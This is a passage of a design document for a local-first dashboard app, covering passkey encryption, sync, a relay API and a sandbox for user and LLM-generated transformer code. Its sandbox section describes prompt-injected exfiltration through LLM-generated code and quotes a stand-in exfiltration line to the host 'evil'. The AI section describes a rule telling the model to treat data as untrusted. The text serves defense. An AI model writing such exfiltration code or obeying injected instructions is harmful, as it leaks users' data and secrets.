3. `POST /auth/login { assertion }` → server verifies, returns `{ access_token, refresh_token, account, wrapped_dek | null, unlock_methods }` — the wrapped copy for **this credential** is returned in the login response, so no separate fetch is needed.
4. Client derives the wrap key from the PRF output and decrypts `wrapped_dek`. If this credential has no PRF output or no wrapped copy, the client offers recovery-key unlock.

**Recovery key (fallback / primary for non-PRF credentials):**
1. `POST /auth/recovery/start { email }` → identical response regardless of account existence; emails a code. Requiring the emailed code (confirmed) means a leaked printed key alone is not sufficient; the consequence — losing email access means losing recovery — is stated on the recovery-key display screen and in Settings.
2. User enters code and `rk`. Client derives `verifier` and `K_rk_wrap` locally.
3. `POST /auth/recovery/finish { email, code, verifier }` → server checks `SHA-256(verifier)` in constant time, returns tokens and the recovery-wrapped DEK. Heavily rate-limited.
4. Client decrypts with `K_rk_wrap`. The server never learns `rk` or the wrap key and cannot unwrap the DEK.
5. Client is prompted to enroll a passkey on this device (§4.5) so `rk` is not needed again here.

### 4.5 Enrolling an additional credential

From an **unlocked** device: `POST /auth/enroll/start` (session) → email code ("A new passkey is being added from Chrome on macOS") → `POST /auth/enroll/verify { code }` → `enroll_token` (10 min) → `create()` + PRF as in §4.3 step 4 → wrap DEK (raw bytes obtained from the device cache or a fresh unlock) → `POST /keys { enroll_token, credential, wrap_method, wrapped_dek }`. The email step closes the hole where a stolen session token alone could add an attacker's passkey.

`DELETE /keys/:credential_id` requires a fresh assertion (`recent_auth` ≤ 5 min) and is **refused if it would leave zero unlock methods**. Rotating the recovery key (`PUT /keys/recovery`) likewise requires a fresh assertion. Removing a credential revokes its sessions but **does not** revoke the DEK from a device that already holds it; DEK rotation (re-encrypting all history under a new key) is out of scope for v1 and listed in §11.

### 4.6 Device cache for silent re-unlock

Requiring a passkey ceremony on every tab open is unacceptable UX. On successful unlock, `db.worker.ts` generates a non-extractable `AES-GCM` `CryptoKey` (the *device key*), stores it in IndexedDB (CryptoKey objects are structured-cloneable), and stores `AES-GCM(DEK, device_key)` beside it. On next launch the worker decrypts silently. Honest threat model: this protects against disk theft and other origins, **not** against XSS running on the origin while the cache exists (XSS could use — but not extract — the device key). Settings offers "Require passkey on every launch" (disables the cache) and "Lock now" (clears in-memory keys and the cache). Datasource credentials are decrypted on the main thread using the non-extractable `K_ds` handed over via `postMessage` (CryptoKeys transfer by structured clone).

### 4.7 Sessions

Access token 15 min (bearer, in memory); refresh token 30 days, rotating, stored in IndexedDB and bound to the credential that created it. The WebSocket authenticates with the access token via `Sec-WebSocket-Protocol`. Background sync uses refresh without user interaction. "Passkey unlocks data, not every request" holds: WebAuthn is required for unlock and sensitive changes (`recent_auth`), never for ordinary sync calls.

### 4.8 Account adoption of anonymous data

When an anonymous user creates or signs into an account:

- **Create account:** a DEK is generated; the local database is adopted as-is; its `site_id` becomes the first site; plaintext `secrets_ciphertext` and `local_secrets` values are encrypted in place under `K_ds`/`K_local`; a snapshot is pushed. No merge.
- **Sign into an existing account with local anonymous data:** offer "merge into account" or "discard local data" (default: merge, with a preview count). Merge encrypts local secrets under the account's DEK, then pushes local data as ordinary changesets — cr-sqlite merges by PK and UUIDs don't collide, so the result is a union. The union contains two `dashboards` rows; the dashboard page offers to merge them (move placements, tombstone one). The same union semantics apply on later reconnects.

### 4.9 Anonymous mode (permanent product option — confirmed)

The app is fully usable with no account, forever. Consequences, stated plainly in the UI:

- There is **no DEK** (confirmed: DEK is created with the account), so datasource credentials and the LLM key are stored **unencrypted at rest** in the local database. Settings shows this next to the credential fields, with "create an account to encrypt secrets" as the call to action. Encrypting anonymous secrets under the device key alone is a possible later hardening (§10, Phase 5+), not v1.
- Data exists on one device only. The eviction warning (confirmed): a dismissible banner in Settings/sync status, plus a dashboard toast when local-only data is older than 24 h. Never a blocking modal. Export/Import is the backup path.
- Everything else — elements, datasources, transformers, sandbox, AI feature — works identically.

---

## 5. Data-Flow Architecture

### 5.1 Graph

Nodes: datasources, transformers, observable elements. Edges: the `edges` table. The in-memory graph in `packages/app/src/lib/dataflow/graph.ts` is rebuilt (cheaply — it's small) whenever `edges`, `transformers`, `datasources`, or `placements` change, via `LocalStore.subscribe`. Cycle detection runs on every edge insert; a cycle rejects the write.

### 5.2 Scheduler (async, not `$derived`)

Transformers execute asynchronously in the sandbox (§7), so `$derived` cannot compute them. The engine is an explicit async DAG scheduler:

- Each node has `value`, `error`, `status` (`idle | running | ok | error | inactive`), and a `version` counter, held in a `$state` map keyed by node id (`dataflow.svelte.ts`). Components read from that map with `$derived`.
- On an upstream update, mark descendants dirty; run dirty nodes in topological order; a node with a dirty ancestor waits.
- Coalescing: if a node is running when another upstream change arrives, it is re-marked dirty and rerun once after completion; intermediate results are discarded by run id.
- Errors set `status='error'` and propagate a distinct `upstream_error` to descendants; observables render the error state.
- Per-transformer timeout from `transformers.timeout_ms`.

### 5.3 Activation

A datasource is **active** iff a reverse traversal over `edges` from it reaches at least one element whose placement is present, `hidden = 0`, and not deleted. The active set is recomputed on placement/edge changes and diffed: newly active external datasources start their poll timer or WebSocket; newly inactive ones stop. Internal and static datasources have no runtime cost and are always "active" trivially. **Hidden = inactive** (confirmed).

### 5.4 Runtime

`DatasourceRuntime` (main thread; needs `fetch`/`WebSocket` with the user's credentials) is a singleton owning one poll timer or socket per active external datasource regardless of consumer count. Each fetch: decrypt `secrets_ciphertext` with `K_ds` → request → apply `response_path` → write `datasource_cache` → feed the scheduler. Polls pause when `document.hidden` (browsers throttle anyway) and resume with an immediate fetch on visibility. On startup the scheduler seeds datasource nodes from `datasource_cache` so the dashboard renders offline with stale values and a staleness indicator.

---

## 6. Frontend Architecture

### 6.1 Routes

```
src/routes/
  +layout.ts                  ssr=false; boot db.worker; run migrations; restore session/device cache
  +layout.svelte              shadcn Sidebar (icons only), right-side panels, toasts
  (auth)/login, register, verify, recover
  (app)/dashboard             the grid (default route)
  (app)/elements              unified Unplaced/Hidden panel as a page (also opens as a Sheet from the sidebar)
  (app)/datasources, (app)/datasources/[id]
  (app)/transformers, (app)/transformers/[id]   editor, version history, run console, AI panel
  (app)/settings              passkeys, recovery key, LLM key, lock/cache options, export/import, sync status
```

### 6.2 State

Per-domain `.svelte.ts` modules (`dashboard.svelte.ts`, `dataflow.svelte.ts`, `auth.svelte.ts`, `sync.svelte.ts`) expose `$state`/`$derived` view models fed by `LocalStore.subscribe` through the worker RPC. The RPC client and runtime singletons are provided via `setContext` from the root layout. Components never issue SQL; all writes go through typed repository functions in `packages/shared` (so cascades and validation are shared with tests and any future native shell).

### 6.3 Grid and interaction

Custom CSS Grid (`grid_cols` columns, fixed row height, auto rows) with Pointer Events (HTML5 DnD has poor touch support and awkward previews). Drag from the panel: `pointerdown` → ghost → on `pointerup` over the grid compute the cell from the grid's bounding box and column width → write the placement. Rearrange and resize: live preview via CSS transforms during the gesture, a single DB write on release (so sync sees one change, not fifty). Collision: shove-down (confirmed) — occupants are pushed down to make room; the layout is compacted upward afterwards so no gaps remain. Below a `sm` breakpoint the grid renders as a single column in `y` order (placements are single-breakpoint by design; responsive layouts are a v2 concern).

### 6.4 Offline shell and data ownership

Service worker precaches the build; an update banner appears when a new version is waiting. Settings offers **Export** (full plaintext JSON of all synced tables, produced locally) and **Import** (merge by PK). Export is the cheapest mitigation for storage eviction and the honest answer to "where is my data".

---

## 7. Transformer Sandboxing

### 7.1 Threat model

Transformer code is (a) written by the user, or (b) generated by an LLM from a datasource sample plus a description. Case (b) means a malicious external API response can prompt-inject exfiltration code that runs with access to every datasource bound to that transformer. "It's the user's own code" is therefore not sufficient; network egress must be blocked by policy.

### 7.2 Design

Deleting `self.fetch` inside a Worker does not work: user code can `new Worker(URL.createObjectURL(blob))` and get a fresh global. CSP on the main document cannot help either, because the app itself needs a permissive `connect-src` for datasources and LLM APIs. The fix is an origin boundary:

- A `<iframe sandbox="allow-scripts">` (no `allow-same-origin` → opaque origin) whose `srcdoc` sets
  `<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'unsafe-inline' 'unsafe-eval'; worker-src blob:; webrtc 'block'">`.
  Inside it, `fetch`, `XMLHttpRequest`, `WebSocket`, `EventSource`, `navigator.sendBeacon`, `<img>`/`<link>` loads, dynamic `import()` of remote modules (no host in `script-src`), WebRTC data channels, and nested workers' network are all blocked by CSP (blob workers inherit the iframe's policy; the srcdoc document also inherits the parent's CSP, and multiple policies combine restrictively). `unsafe-eval` is required for `new Function`.
- The iframe document hosts only a trusted controller (inline in the srcdoc). **User code runs exclusively inside a Worker** the controller spawns per run (pooled, max 2) via `new Function('inputs', code)`. Workers cannot navigate (`WorkerLocation` is read-only and there is no `window`), which closes the `location.href = 'https://evil/?data'` exfiltration channel a sandboxed iframe document would otherwise have. The Worker also gives `terminate()`-based timeouts. The controller itself has no network either.
- Main ↔ Worker communication uses a `MessageChannel` whose port is handed to the iframe and transferred into the Worker: structured clone only, no live references, one hop.
- Contract: `run({ runId, code, inputs: JsonValue[], timeoutMs })` → `{ runId, ok: true, output: JsonValue, durationMs }` or `{ runId, ok: false, error: { name, message, stack } }`. Output must survive `JSON`-compatible structured clone; functions, DOM nodes, and cyclic structures are rejected with a clear error.
- Timeout: controller `terminate()`s the Worker and reports `TimeoutError`; the main thread additionally has a watchdog that tears down and recreates the whole iframe if the controller itself stops responding.
- `console.log` inside user code is captured and forwarded to the editor's run console.

### 7.3 Later hardening

QuickJS-WASM inside the same iframe would add memory limits and interrupt-based CPU limits (no respawn cost). Justified only if transformers are ever shared between users. Phase 5+.

---

## 8. AI Transformer Suggestion

1. In the transformer editor the user picks inputs and writes a description; an optional hint is derived from the bound observable ("will be charted as bar: x=category, y=value").
2. The client builds a **sample**: first 5 items of each input, string values truncated to 200 chars, total ≤ 4 KiB. The user can **edit or redact** the sample in place before sending.
3. **Consent modal** shows the literal sample bytes, the provider, and the model, with "this leaves your device" wording. Consent is per transformer, not global. A persistent indicator shows while a suggestion is pending or unsaved.
4. The client calls the provider **directly** with the key from `local_secrets`. Anthropic requires the `anthropic-dangerous-direct-browser-access: true` header for browser calls; OpenAI allows browser CORS. The relay is never involved.
5. Prompt: a system message fixing the contract — one `function transform(inputs) { ... }` returning JSON-serializable data, no imports, no network, no globals beyond `Math`/`Date`/`JSON` — plus an instruction to treat the sample as untrusted data (partial defense against injection; the sandbox is the real one). The user message carries the sample, the description, and the shape hint.
6. The single code block in the response is loaded as a **draft** and executed immediately in the sandbox against the same sample; output and errors appear in the run console. Nothing is saved automatically.
7. Save creates a `transformer_versions` row with `note = 'AI suggestion (reviewed)'` and appends to `ai_egress_log`.

---

## 9. Server Surface (Relay)

Framework **Hono on Bun**; storage **`bun:sqlite`** (metadata tables plus envelope BLOBs; envelopes can move to object storage later behind the same repository interface). WebAuthn via `@simplewebauthn/server` (RP ID, expected origins, and challenge storage configured per environment). Email via a pluggable sender (console in dev; Resend/SES/SMTP in prod). All routes under `/api/v1`; auth middleware validates the bearer access token except where noted. All account-existence-sensitive routes return constant responses and timings.

| Method | Route | Auth | Stores / effect | Notes |
|---|---|---|---|---|
| POST | `/auth/register` | none | `pending_accounts` (email, code hash, expiry) | constant response; rate-limited per email + IP |
| POST | `/auth/verify` | none | consumes code; issues `reg_token` | 15 min, 5 attempts |
| POST | `/auth/challenge` | none | `challenges` (random, 5 min) | no email; discoverable credentials |
| POST | `/auth/login` | assertion | verifies; issues access + refresh; marks `recent_auth` | returns this credential's `wrapped_dek` |
| POST | `/auth/refresh` | refresh token | rotates refresh token | revoked if credential deleted |
| POST | `/auth/logout` | session | revokes refresh token | |
| POST | `/auth/recovery/start` | none | emails code | constant response; rate-limited |
| POST | `/auth/recovery/finish` | none | verifies code + `SHA-256(verifier)`; issues tokens | returns recovery-wrapped DEK; strict rate limit + lockout |
| POST | `/auth/enroll/start` | session | emails code | |
| POST | `/auth/enroll/verify` | session | issues `enroll_token` | 10 min |
| POST | `/keys` | `reg_token` or `enroll_token` | `credentials` (public key, counter, transports) + `wrapped_keys` (ciphertext, method, aad ids) atomically | first call creates the account; `attestation: none`, no chain verification |
| GET | `/keys` | session | reads metadata | Settings list: label, method, created, last used, PRF-capable |
| PATCH | `/keys/:credential_id` | session | label | |
| DELETE | `/keys/:credential_id` | session + `recent_auth` | deletes credential, wrapped copy, its sessions | refused if it leaves zero unlock methods |
| PUT | `/keys/recovery` | session + `recent_auth` (or `reg_token`) | `recovery` (verifier hash, wrapped DEK) | create or rotate |
| POST | `/sync/push` | session | `envelopes` (account, seq, site_id, schema_version, from, to, blob) | returns assigned `seq`; per-account size/rate caps |
| GET | `/sync/pull` | session | reads envelopes `seq > since`, excluding caller's `site_id` | returns `next`, `oldest_retained_seq`; `410` if `since` is below retention |
| GET | `/sync/subscribe` | access token via WS subprotocol | in-memory fan-out per account | sends `{ seq }` only |
| POST | `/sync/snapshot` | session | `snapshots` (account, covers_seq, schema_version, blob); schedules pruning | keeps highest `covers_seq` |
| GET | `/sync/snapshot` | session | latest snapshot | onboarding / re-bootstrap |
| GET | `/account` | session | account meta, `min_schema_version`, quotas, usage | |
| DELETE | `/account` | session + `recent_auth` | marks account `deleted_at`; revokes all sessions and credentials immediately; envelopes/snapshots/wrapped keys purged by a job after **7 days** (confirmed) | during grace, sync calls return `403 account_deleted`; clients offer to wipe local data; undo is a support operation |

**Deferred (Phase 5+):** `POST /proxy/fetch` — CORS pass-through. When built: opaque forwarding, bodies never logged, per-account quotas, and UI disclosure that the relay sees plaintext in transit for that datasource.

**Rate limiting:** Hono middleware, token bucket keyed by client IP (honouring `X-Forwarded-For` only from the trusted proxy) for unauthenticated routes; per-account buckets for authenticated ones. Initial values (confirmed; environment-tunable):

| Route(s) | Limit |
|---|---|
| `/auth/recovery/*`, `/auth/verify`, `/auth/enroll/verify` | 5 / min / IP and 10 / hour / email; lockout of the email for 1 hour after 10 failed code or verifier checks |
| `/auth/register`, `/auth/recovery/start`, `/auth/enroll/start` (email senders) | 3 / hour / email, 20 / hour / IP |
| `/auth/challenge`, `/auth/login` | 30 / min / IP |
| `/sync/push` | 60 / min / account, 8 MiB / hour / account; single envelope ≤ 1 MiB |
| `/sync/snapshot` (POST) | 4 / day / account; snapshot ≤ 64 MiB |
| `/sync/pull`, `/sync/snapshot` (GET) | 120 / min / account |

**Relay tables (exhaustive):** `accounts`, `pending_accounts`, `challenges`, `credentials`, `wrapped_keys`, `recovery`, `sessions`, `envelopes`, `snapshots`, `email_codes`. Nothing stores plaintext content, datasource payloads, or API keys: the only arbitrary-payload routes accept envelopes whose body is ciphertext.

---

## 10. Phased Roadmap

### Phase 0 — Foundation and go/no-go spike — **done 2026-09-22**
- TypeScript 6 across the workspace; root `CLAUDE.md` rewritten for this project; `git init`; GitHub Actions CI (`typecheck`, `bun test`, `svelte-check`, build, Playwright e2e).
- `packages/shared`: `LocalStore` interface, schema as `MIGRATIONS`, `migrate()`, shared types, UUIDv7, fractional `sort_key`s, graph helpers (cycle detection, active set, topological order), repositories with cascades, a `bun:sqlite` test double, 11 unit tests including the CRR-rules check.
- `packages/app`: `CrSqliteWasmStore` driver + `openStore()` (OPFS/IDB/memory), `Sandbox` (iframe + CSP + Worker), `/spike` page and Playwright e2e; `adapter-static`, `ssr=false`.
- `packages/backend`: `Bun.serve` skeleton with `/api/v1/health`.
- **Acceptance met:** spike passes in Chromium, Firefox, and WebKit with no COOP/COEP (§1.4). cr-sqlite is confirmed.

### Phase 1 — MVP: single device, local only — **done 2026-09-22**
- cr-sqlite build with the CRR-compatible schema and `crsql_as_crr` from the start; `db.worker.ts` owns the store and exposes the `shared` repository `commands` over a typed RPC (`Db.call`), so every transaction runs where the database lives; `liveQuery()` re-runs reads after commits via `createSubscriber`.
- Service worker precaches the build and the SPA shell (fetched via the root URL — static hosts do not always expose `/index.html`); `ssr=false`, `adapter-static`; web manifest.
- Route groups: bare `src/routes/+layout.svelte`, DB-owning shell in `(app)/+layout.svelte`; `/spike` stays outside the shell because two owners of the OPFS access-handle pool cannot coexist.
- Single-tab ownership via `navigator.locks` (`ifAvailable`); the database is opened only after the lock is won, otherwise a second tab would fail the OPFS probe and silently open a different IndexedDB database.
- Sidebar (icons), grid (drag/place/resize/hide/delete, shove-down + compaction, live preview), unified Unplaced/Hidden panel, create dialog.
- Editables on the shared `task_items` model (tree, collapsed-by-default checklists, nested add) and typed tables (per-cell rows); aggregation observable with a bind-data dialog; `static` and `internal` datasources page with live previews and the active badge.
- Dataflow engine: async DAG scheduler with input-signature short-circuiting; transformers already execute in the sandbox (UI arrives in 1.5).
- Export/Import JSON (upsert by PK); Settings with storage status, `persist()` request, eviction banner and once-a-day toast.
- **Acceptance met** (Playwright, Chromium + Firefox, plus offline against the production build): create a checklist, place it, tick items, nest a sub-task; bind an aggregation (`sum of done`) that updates live as items are ticked; hiding the aggregation deactivates its datasource and unhiding restores it; drop onto an occupied area shoves occupants down; hide/unhide/delete; reload persists; the URL opens offline with data; export → import into a fresh profile restores the element.
- Findings: bits-ui dialogs swallow pointer events during their exit animation (tests wait for the dialog to detach); `getByRole` ignores `hasText`; default names computed from UI state race rapid clicks — defaults are now computed inside repository transactions.

### Phase 1.5 — Charts, external datasources, transformers — **done 2026-09-22**
- `chart` observable on LayerChart 2.5 via shadcn-svelte's chart container: bar (grouped, optional horizontal), line, area (stacked), pie, radial (`ArcChart`), radar (declarative `Chart radial` with a `marks` snippet — the imperative `<Svg center>` route did not center in 2.5). Config `{ type, x, y[], horizontal }` in `elements.config_json`; the bind-data dialog picks type, x field and series from the bound dataset's fields.
- `external` datasources (polling): `DatasourceRuntime` on the main thread owns one timer per *active* source (min 5 s), pauses while the document is hidden, fetches immediately on activation/visibility, and writes `datasource_cache`; the engine reads the cache and shows stale-but-present values with any fetch error alongside. "Fetch now" works for inactive sources too. Headers live in `secrets_ciphertext` as plaintext JSON until an account exists (§4.9); `response_path` accepts JSON Pointer or dot paths.
- Transformer editor (`/transformers/[id]`): ordered inputs on `edges`, code textarea (Tab, Ctrl/⌘+Enter to run, Ctrl/⌘+S to save), run console with captured `console.log`, live status, append-only versions with restore. Editor runs use a page-local `Sandbox`; live evaluation is the engine's.
- Engine fix: a transformer's re-run signature now includes its current version id and timeout — previously saving new code did not re-evaluate.
- **Acceptance met** (Chromium + Firefox): all six chart types render from a static source and survive reload; a mocked API is polled only while a visible chart consumes it, sends the stored `Authorization` header, stops within one interval of hiding, and keeps its last value; a 500 surfaces as an error without breaking the page; a transformer groups rows, feeds a bar chart (grouped labels, not raw rows), reports `live: error` on a throwing version and recovers on restore.
- Findings: `commands` spreads whole repo modules, so non-command exports (constants, sync helpers) must live outside `repo/*`; `getByRole` triggers of bits-ui `Select` are `button`s, items are `option`s; LayerChart marks carry `lc-path`.

### Phase 2 — Relay, accounts, passkeys, unencrypted sync (dev flag)
- Hono relay with `/auth/*`, `/keys` (credential storage; `wrapped_dek` may be a placeholder), `/sync/*`, `/account`.
- Passkey registration/login with discoverable credentials (PRF captured but not yet used), email codes, sessions/refresh.
- Sync engine end to end with a `DASHIT_PLAINTEXT_SYNC=1` dev flag (envelopes unencrypted) so CRDT behaviour, snapshots, pruning, `410` re-bootstrap, and schema-version gating are proven without crypto in the way. The flag cannot be enabled in production builds.
- Anonymous-data adoption flow (§4.8).
- **Acceptance:** two browser profiles on one account converge after concurrent offline edits to the same table row (different cells) and the same checklist (different items); a profile offline past retention re-bootstraps from a snapshot; a client with a lower `schema_version` refuses newer envelopes.

### Phase 3 — Encryption and key management
- DEK generation at account creation, PRF wrapping (single-ceremony login; two-step only at enrollment), recovery key (Crockford base32, verifier/wrap split, email code), device cache, lock, "require passkey on launch".
- `K_ds`/`K_local` at rest, including in-place encryption of anonymous plaintext secrets on account creation/adoption (§4.8); envelope encryption with per-site subkeys and canonical AAD; remove the plaintext-sync flag from the build.
- Enroll/remove credentials with email confirmation; last-method protection; account deletion with the 7-day grace job.
- **Acceptance:** device A creates data; device B (fresh profile) unlocks with a synced passkey and sees it; device C unlocks with recovery key + email code only; an anonymous profile with a plaintext API key creates an account and the relay's first snapshot contains only ciphertext; relay database inspection shows no plaintext anywhere; deleting the only passkey with no recovery key is refused; a device with the cache cleared requires a passkey, one with the cache does not; after `DELETE /account`, other devices get `403 account_deleted` and offer to wipe.

### Phase 4 — AI transformer suggestion
- LLM key in `local_secrets`; test asserts it never appears in any envelope.
- Sample builder with redaction, consent modal, direct provider calls, draft → sandbox run → save loop, `ai_egress_log`.
- **Acceptance:** enter a provider key; request a suggestion; see and edit the exact sample before sending; the generated code runs against the sample; saving creates a version with the AI note; the egress log records the call.

### Phase 5+ — Hardening and deferred items
- CORS proxy route (confirmed deferred). Multi-tab arbitration via SharedWorker (confirmed deferred; Phases 1–4 detect a second tab with `navigator.locks` and show a read-only warning). WebSocket datasources. Tauri shell. QuickJS sandbox. DEK rotation. Responsive breakpoints for placements. Device-key encryption of anonymous-mode secrets.

---

## 11. Decision Log

No open questions remain. Every "recommend and justify" point and every risk question has a recorded decision:

| # | Question | Decision | Where |
|---|---|---|---|
| 1 | Sync engine risk | Commit to cr-sqlite, gated by the Phase 0 spike; no bake-off | §3.1, §10 |
| 2 | CORS proxy timing | Deferred to Phase 5+ | §9 |
| 3 | Multi-tab OPFS arbitration | Deferred to Phase 5+; single active tab + warning | §10 |
| 4 | Apple/iCloud PRF | Silent per-credential fallback | §4.3 |
| 5 | Anonymous mode | Permanent product option | §4.9 |
| 6 | Storage-eviction warning | Banner + 24 h toast; never blocking | §4.9, §6.4 |
| 7 | Grid collision | Shove-down | §6.3 |
| 8 | Recovery key format | 26-char Crockford base32 | §4.3 |
| 9 | Recovery login factor | Key + emailed code | §4.4 |
| 10 | Account deletion | Revoke immediately, purge after 7 days | §9 |
| 11 | Tombstone GC window | 90 days | §3.7 |
| 12 | Rate limits | Proposed numbers accepted as initial config | §9 |
| 13 | Transformer input versioning | Code only | §2.3 |
| 14 | DEK lifetime | Created with the account; anonymous secrets unencrypted at rest | §4.1, §4.9 |
| 15 | Checklist model | One `task_items` table for task and checklist | §2.3 |

**Explicitly out of scope for v1** (tracked in Phase 5+): DEK rotation after device compromise, QuickJS sandbox, responsive multi-breakpoint placements, WebSocket datasources, Tauri shell, device-key encryption of anonymous secrets, CORS proxy, multi-tab writes.

---

## 12. Change History

### Revision 3 (decisions + second-pass fixes)

- All fifteen decisions recorded in §11; the open-questions list is gone.
- `checklist_items` merged into `task_items`; cascade and CRR registration updated.
- Anonymous mode specified (§4.9) with its security consequence stated: no DEK, secrets unencrypted at rest, Settings disclosure; in-place encryption on account creation/adoption (§4.8); merged-dashboards offer.
- `K_ds` salt is an application constant (the column syncs, and anonymous users have no `account_id`).
- Sandbox CSP gains `webrtc 'block'`; user code confined to the Worker (no navigation channel); `import()` noted as blocked.
- `attestation: 'none'`; relay does not verify attestation chains.
- Rate-limit table with concrete initial values; `DELETE /account` grace semantics (`403 account_deleted`).
- Phase 1/1.5/3 acceptance criteria extended for shove-down, nested checklist tasks, anonymous-to-account encryption, and account deletion.

### Revision 2 (review fixes)

- **Security:** recovery key is split into a verifier and a wrap key; the server can no longer unwrap the DEK. Recovery login also requires an email code. Transformer sandbox moved into an opaque-origin iframe with CSP `connect-src 'none'`; the "delete `self.fetch`" approach was bypassable and the AI feature widens the threat model to prompt-injected code.
- **Auth:** single-ceremony passkey login (two-step PRF only at enrollment); constant `APP_PRF_SALT`; wrapped DEK returned in the login response; wrapping is per credential; AES-GCM with AAD instead of AES-KW; non-extractable `CryptoKey`s; device cache for silent re-unlock; discoverable credentials and constant responses to prevent enumeration; last-unlock-method protection; sessions/refresh defined; anonymous-data adoption flow.
- **Schema:** CRR-compatibility rules made explicit and applied (PK everywhere, defaults on all non-PK columns, no FK/CHECK/UNIQUE); `placements` keyed by `element_id`; `table_cells` replaces `cells_json`; string `sort_key` replaces `REAL sort_order`; unified `edges` table replaces `bindings` + `input_source_ids_json`; `elements.category` dropped; `datasource_cache`, `local_meta`, `ai_egress_log` added; `device_keys` dropped; cascade and GC rules specified.
- **Sync:** CBOR changesets; per-site HKDF subkeys and canonical AAD; relay `seq` replaces per-site `db_version` for pruning; `410` re-bootstrap path; schema-version gating and cr-sqlite alter protocol; snapshot `covers_seq`; push debounce and nudge fallback; explicit metadata-visibility statement.
- **Runtime:** cr-sqlite WASM build chosen in Phase 1 (not swappable later); VFS decided by a spike; service worker/PWA, `ssr=false`, `adapter-static`, deployment topology; export/import.
- **Dataflow:** async DAG scheduler replaces "`$derived` recomputes transformers".
- **Roadmap:** Phase 0 gains a go/no-go spike; Phase 2 becomes relay + accounts + unencrypted sync; Phase 3 becomes encryption only; testing strategy folded into acceptance criteria (Playwright with a CDP virtual authenticator with `hasPrf` for WebAuthn; `bun test` for shared/backend; a two-profile sync harness).
- Removed the plan-mode "Verification" boilerplate.
